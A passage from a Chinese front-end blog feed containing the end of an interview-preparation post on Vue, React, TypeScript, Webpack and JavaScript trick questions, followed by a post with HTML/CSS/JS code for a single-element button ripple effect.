href="https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA" title="null">文档</a>全都有，看红色的字。</li><li>把名字翻译一遍就是满分</li><li>要特别说明哪个钩子里请求数据，<a href="https://segmentfault.com/q/1010000010643393" title="null">答案是 mounted</a></li></ol></li><li><p>必考：Vue 如何实现组件间通信？</p><ol><li>父子组件：使用 v-on 通过事件通信</li><li>爷孙组件：使用两次 v-on 通过爷爷爸爸通信，爸爸儿子通信实现爷孙通信</li><li>任意组件：使用 eventBus &#x3D; new Vue() 来通信，eventBus.$on 和 eventBus.$emit 是主要API</li><li>任意组件：使用 Vuex 通信</li></ol></li><li><p>必考：Vue 数据响应式怎么做到的？</p><ol><li>答案在文档《<a href="https://cn.vuejs.org/v2/guide/reactivity.html" title="null">深入响应式原理</a>》</li><li>要点<ol><li>使用 Object.defineProperty 把这些属性全部转为 getter&#x2F;setter</li><li>Vue 不能检测到对象属性的添加或删除，解决方法是手动调用 Vue.set 或者 this.$set</li></ol></li></ol></li><li><p>必考：Vue.set 是做什么用的？<br>见上一题</p></li><li><p>Vuex 你怎么用的？</p><ol><li>背下文档第一句：Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式</li><li>说出核心概念的名字和作用：State&#x2F;Getter&#x2F;Mutation&#x2F;Action&#x2F;Module</li></ol></li><li><p>VueRouter 你怎么用的？</p><ol><li><p>背下文档第一句：Vue Router 是 Vue.js 官方的路由管理器。</p></li><li><p>说出核心概念的名字和作用：History 模式&#x2F;导航守卫&#x2F;路由懒加载</p></li><li><p>说出常用 API：router-link&#x2F;router-view&#x2F;this.$router.push&#x2F;this.$router.replace&#x2F;this.$route.params</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(<span class="string">&#x27;/user-admin&#x27;</span>)</span><br><span class="line"><span class="keyword">this</span>.$route.params</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li><li><p>路由守卫是什么？<br>看官方文档的例子，背里面的关键的话</p></li></ol><h1 id="框架-React"><a href="#框架-React" class="headerlink" title="框架 React"></a>框架 React</h1><ol><li><p>必考：受控组件 V.S. 非受控组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FInput</span> <span class="attr">value</span>=<span class="string">&#123;x&#125;</span> <span class="attr">onChange</span>=<span class="string">&#123;fn&#125;/</span>&gt;</span> 受控组件</span><br><span class="line"><span class="tag">&lt;<span class="name">FInput</span> <span class="attr">defaultValue</span>=<span class="string">&#123;x&#125;</span> <span class="attr">ref</span>=<span class="string">&#123;input&#125;/</span>&gt;</span> 非受控组件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>区别受控组件的状态由开发者维护，非受控组件的状态由组件自身维护（不受开发者控制）</p></li><li><p>必考：React 有哪些生命周期函数？分别有什么用？（Ajax 请求放在哪个阶段？）<br>答题思路跟 Vue 的一样</p><ol><li>钩子在<a href="https://react.docschina.org/docs/state-and-lifecycle.html" title="null">文档</a>里，蓝色框框里面的都是生命周期钩子</li><li>把名字翻译一遍就是满分</li><li>要特别说明哪个钩子里请求数据，<a href="https://segmentfault.com/q/1010000008133309" title="null">答案是 componentDidMount</a></li></ol></li><li><p>必考：React 如何实现组件间通信？</p><ol><li>父子靠 props 传函数</li><li>爷孙可以穿两次 props</li><li>任意组件用 Redux（也可以自己写一个 eventBus）</li></ol></li><li><p>必考：shouldComponentUpdate 有什么用？</p><ol><li>要点：用于在没有必要更新 UI 的时候返回 false，以提高渲染性能</li><li>参考：<a href="http://taobaofed.org/blog/2016/08/12/optimized-react-components/" title="null">http://taobaofed.org/blog/2016/08/12/optimized-react-components/</a></li></ol></li><li><p>必考：虚拟 DOM 是什么？</p><ol><li>要点：虚拟 DOM 就是用来模拟 DOM 的一个对象，这个对象拥有一些重要属性，并且更新 UI 主要就是通过对比（DIFF）旧的虚拟 DOM 树 和新的虚拟 DOM 树的区别完成的。</li><li>参考：<a href="http://www.alloyteam.com/2015/10/react-virtual-analysis-of-the-dom/" title="null">http://www.alloyteam.com/2015/10/react-virtual-analysis-of-the-dom/</a></li></ol></li><li><p>必考：什么是高阶组件？</p><ol><li>要点：<a href="https://react.docschina.org/docs/higher-order-components.html" title="null">文档原话</a>——高阶组件就是一个函数，且该函数接受一个组件作为参数，并返回一个新的组件。</li><li>举例：React-Redux 里 <a href="https://react-redux.js.org/api/connect" title="null">connect 就是一个高阶组件</a>，比如 <code>connect(mapState)(MyComponent)</code> 接受组件 MyComponent，返回一个具有状态的新 MyComponent 组件。</li></ol></li><li><p>React diff 的原理是什么？<br>看你记忆力了：<a href="https://imweb.io/topic/579e33d693d9938132cc8d94" title="null">https://imweb.io/topic/579e33d693d9938132cc8d94</a></p></li><li><p>必考 Redux 是什么？</p><ol><li>背下文档第一句：Redux 是 JavaScript 状态容器，提供可预测化的状态管理。重点是『状态管理』。</li><li>说出核心概念的名字和作用：Action&#x2F;Reducer&#x2F;Store&#x2F;单向数据流</li><li>说出常用 API：store.dispatch(action)&#x2F;store.getState()</li></ol></li><li><p>connect 的原理是什么？<br>react-redux 库提供的一个 API，connect 的作用是让你把组件和store连接起来，产生一个新的组件（connect 是高阶组件）<br>参考：<a href="https://segmentfault.com/a/1190000017064759" title="null">https://segmentfault.com/a/1190000017064759</a></p></li></ol><h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><ol><li>never 类型是什么？<br>不应该出现的类型</li><li>TypeScript 比起 JavaScript 有什么优点？<br>提供了类型约束，因此更可控、更容易重构、更适合大型项目、更容易维护</li></ol><h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><ol><li>必考：有哪些常见 loader 和 plugin，你用过哪些？</li><li>英语题：loader 和 plugin 的区别是什么？</li><li>必考：如何按需加载代码？</li><li>必考：如何提高构建速度？</li><li>转义出的文件过大怎么办？</li></ol><p>上面五题请看这个不错的参考：<a href="https://zhuanlan.zhihu.com/p/44438844" title="null">https://zhuanlan.zhihu.com/p/44438844</a></p><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><ol><li>必考：什么是 XSS？如何预防？<br>比较复杂，看我的文章 <a href="https://zhuanlan.zhihu.com/p/22500730" title="null">https://zhuanlan.zhihu.com/p/22500730</a></li><li>必考：什么是 CSRF？如何预防？<br>比较复杂，看若愚的文章 <a href="https://zhuanlan.zhihu.com/p/22521378" title="null">https://zhuanlan.zhihu.com/p/22521378</a></li></ol><h1 id="开放题目"><a href="#开放题目" class="headerlink" title="开放题目"></a>开放题目</h1><ol><li>必考：你遇到最难的问题是怎样的？<br>要点：一波三折。参考 <a href="https://www.zhihu.com/question/35323603" title="null">https://www.zhihu.com/question/35323603</a></li><li>你在团队的突出贡献是什么？<br>把小事说大。</li><li>最近在关注什么新技术<br>书、博客、推特、知乎，不要说 CSDN、百度。</li><li>有没有看什么源码，看了后有什么记忆深刻的地方，有什么收获<br>看过源码说源码，推荐看 underscore.js 的源码<br>没看过源码就说同事的代码，代码烂就说哪里烂，代码好就说哪里好<br>收获：命名规范、设计模式</li></ol><h1 id="刁钻题目"><a href="#刁钻题目" class="headerlink" title="刁钻题目"></a>刁钻题目</h1><ol><li><p>代码</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].<span class="keyword">map</span>(<span class="built_in">parseInt</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="literal">NaN</span></span><br><span class="line"><span class="literal">NaN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = &#123;name: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.x</span> = <span class="selector-tag">a</span> = &#123;&#125;</span><br><span class="line">问 <span class="selector-tag">a</span><span class="selector-class">.x</span> 是多少？</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>(a ==1 &amp;&amp; a== 2 &amp;&amp; a==3)</code> 可能为 true 吗？</p><ol><li><p>利用 &#x3D;&#x3D; 会调用 valueOf() 的特性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line"> <span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="title function_">valueOf</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span>++</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>利用 a 会读取 window.a 的特性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>; </span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">window</span>, <span class="string">&#x27;a&#x27;</span>, &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> value++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 或者 </span></span><br><span class="line">a ===<span class="number">1</span> &amp;&amp; a=== <span class="number">2</span> &amp;&amp; a===<span class="number">3</span> <span class="comment">// true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol><h1 id="超纲题"><a href="#超纲题" class="headerlink" title="超纲题"></a>超纲题</h1><ol><li><p>JS 垃圾回收机制</p><ol><li>看图讲解 <a href="https://javascript.info/garbage-collection" title="null">https://javascript.info/garbage-collection</a><ol><li>什么是垃圾</li><li>如何捡垃圾（遍历和计数，只是<a href="https://www.jianshu.com/p/a8a04fd00c3c" title="null">不同的算法</a>而已）</li><li>前端又有其特殊性（JS进程和DOM进程）</li></ol></li><li>更深入一些的讲解 <a href="http://newhtml.net/v8-garbage-collection/" title="null">http://newhtml.net/v8-garbage-collection/</a></li></ol></li><li><p>Eventloop 说一下</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">new</span> Promise(<span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">    resolve();</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">4</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>肤浅理解：『一会儿』和『尽快』异步任务</p></li><li><p>详细理解：Eventloop 是个啥？</p></li><li><p>浏览器有 Eventloop 吗？</p></li><li><p>每个 API 对应哪个任务队列？</p><ol><li>setTimeout</li><li>setImmediate（浏览器没有）</li><li>process.nextTick（浏览器没有）</li><li>MutationObserver（Node 没有）</li><li>promise.then</li><li>await</li></ol></li><li><p>这种题目尽量说思路，因为你不可能通过眼睛看出结果（必须画图）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">async <span class="keyword">function</span> <span class="title function_">async1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">    await async2();</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">async <span class="keyword">function</span> <span class="title function_">async2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Promise(<span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>);</span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：这一题的答案不唯一，在 Node.js 和 Chrome 的结果不一样，甚至在 Chrome 上也是时而这个答案，时而那个答案。所以还是说思路最重要。</p></li></ol></li></ol><h1 id="个性化题目"><a href="#个性化题目" class="headerlink" title="个性化题目"></a>个性化题目</h1><ul><li>PWA</li><li>echarts.js &#x2F; d3.js</li><li>three.js</li><li>flutter</li><li>SSR</li></ul><p>做个 hello world 基本就能应付面试了，如果怕应付不了，就再做个复杂点的。 </p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>单标签实现按钮涟漪效果</title>
      <link href="/Blog/2019/05/20/essay/%E5%8D%95%E6%A0%87%E7%AD%BE%E5%AE%9E%E7%8E%B0%E6%8C%89%E9%92%AE%E6%B6%9F%E6%BC%AA%E6%95%88%E6%9E%9C/index/"/>
      <url>/Blog/2019/05/20/essay/%E5%8D%95%E6%A0%87%E7%AD%BE%E5%AE%9E%E7%8E%B0%E6%8C%89%E9%92%AE%E6%B6%9F%E6%BC%AA%E6%95%88%E6%9E%9C/index/</url>
      
        <content type="html"><![CDATA[<h4 id="主要通过更换-css-上的-animation-来实现涟漪效果。"><a href="#主要通过更换-css-上的-animation-来实现涟漪效果。" class="headerlink" title="主要通过更换 css 上的 animation 来实现涟漪效果。"></a>主要通过更换 <code>css</code> 上的 <code>animation</code> 来实现涟漪效果。</h4><h4 id="但是大部分的实现方法会增加一个空白节点，"><a href="#但是大部分的实现方法会增加一个空白节点，" class="headerlink" title="但是大部分的实现方法会增加一个空白节点，"></a>但是大部分的实现方法会增加一个空白节点，</h4><h4 id="所以想出通过操作伪元素的方案来做。"><a href="#所以想出通过操作伪元素的方案来做。" class="headerlink" title="所以想出通过操作伪元素的方案来做。"></a>所以想出通过操作伪元素的方案来做。</h4><h4 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h4><h4 id="在线体验"><a href="#在线体验" class="headerlink" title="在线体验"></a><a href="http://js.jirengu.com/hokeb/1/edit">在线体验</a></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.input</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">5em</span> <span class="number">10em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">0.3em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">189</span>, <span class="number">86</span>, <span class="number">86</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.input1</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">      <span class="comment">/* transition: all 0.4s ease-in-out; */</span></span></span><br><span class="line"><span class="language-css">      <span class="attribute">z-index</span>: <span class="number">1111</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">      <span class="comment">/* top: 0;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">            left: 0; */</span></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* animation: spin 01s linear; */</span></span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.45</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@keyframes</span> spin &#123;</span></span><br><span class="line"><span class="language-css">      <span class="number">0%</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.45</span>);</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="number">100%</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">150</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: transparent;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;fn(event)&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input input1&quot;</span>&gt;</span></span><br><span class="line">    这是一个按钮</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 这是一个操作伪元素样式的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">ruleSelector</span>(<span class="params">selector</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">uni</span>(<span class="params">selector</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> selector.<span class="title function_">replace</span>(<span class="regexp">/::/g</span>, <span class="string">&quot;:&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// es6</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">document</span>.<span class="property">styleSheets</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> a.<span class="title function_">concat</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(b.<span class="property">cssRules</span>));</span></span><br><span class="line"><span class="language-javascript">        &#125;, [])</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> x.<span class="property">selectorText</span> === selector;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// es5</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// return Array.prototype.filter.call(Array.prototype.concat.apply([], Array.prototype.map.call(document.styleSheets, function (x) &#123;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   return Array.prototype.slice.call(x.cssRules);</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// &#125;)), function (x) &#123;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   return uni(x.selectorText) === uni(selector);</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// &#125;);</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">top</span> = e.<span class="property">offsetY</span> - <span class="built_in">parseInt</span>(<span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">width</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="number">10</span>) / <span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">left</span> = e.<span class="property">offsetX</span> - <span class="built_in">parseInt</span>(<span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span></span></span><br><span class="line"><span class="language-javascript">        .<span class="property">height</span>, <span class="number">10</span>) / <span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">animation</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 不这样做会被合并</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">ruleSelector</span>(<span class="string">&quot;.input1::after&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">animation</span> = <span class="string">&#x27;spin .5s linear&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何用js改变伪元素的样式？</title>
